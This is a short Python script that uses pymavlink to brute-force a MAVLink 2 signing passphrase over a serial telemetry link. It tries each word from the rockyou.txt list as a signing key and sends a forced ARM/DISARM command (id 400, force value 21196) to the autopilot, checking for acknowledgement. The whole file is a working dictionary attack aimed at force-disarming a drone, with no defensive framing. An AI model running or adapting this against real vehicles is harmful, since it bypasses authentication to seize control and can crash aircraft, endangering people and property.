from __future__ import print_function

import time

from pymavlink import mavutil
import sys
import os
os.environ['MAVLINK20'] = '1'
# borroewd from the mavproxy code base
def passphrase_to_key(passphrase):
    '''convert a passphrase to a 32 byte key'''
    import hashlib
    h = hashlib.new('sha256')
    if sys.version_info[0] >= 3:
        print("here")
        passphrase = passphrase.encode('ascii')
    h.update(passphrase)
    return h.digest()

def load_wordlist(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]
    
wordlist_file = "rockyou.txt"  
wordlist = load_wordlist(wordlist_file)

connection = mavutil.mavlink_connection("/dev/ttyUSB1", baud=57600)
connection.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS,
                                               mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
print('success')
connection.wait_heartbeat()
print("Heartbeat from system (system %u component %u)" % (connection.target_system, connection.target_component))

for passphrase in wordlist:
    print(f"Testing passphrase: {passphrase}")
    key = passphrase_to_key(passphrase)
    
    try:
        connection.setup_signing(key, sign_outgoing=True)
        print("Signing setup complete with key:", key)
      
        #https://discuss.ardupilot.org/t/pymavlink-disarm-command/25425
        connection.mav.command_long_send(
            1,  # autopilot system id
            1,  # autopilot component id
            400,  # command id, ARM/DISARM
            0,  # confirmation
            0.0,  # disarm
            21196.0, 0.0, 0.0, 0.0, 0.0, 0.0  # unused parameters for this command
        )
        ack_response = connection.recv_match(type='COMMAND_ACK', timeout=2)
        print("ACK Response:", ack_response)

    except Exception as e:
        print(f"Error with passphrase {passphrase}: {e}")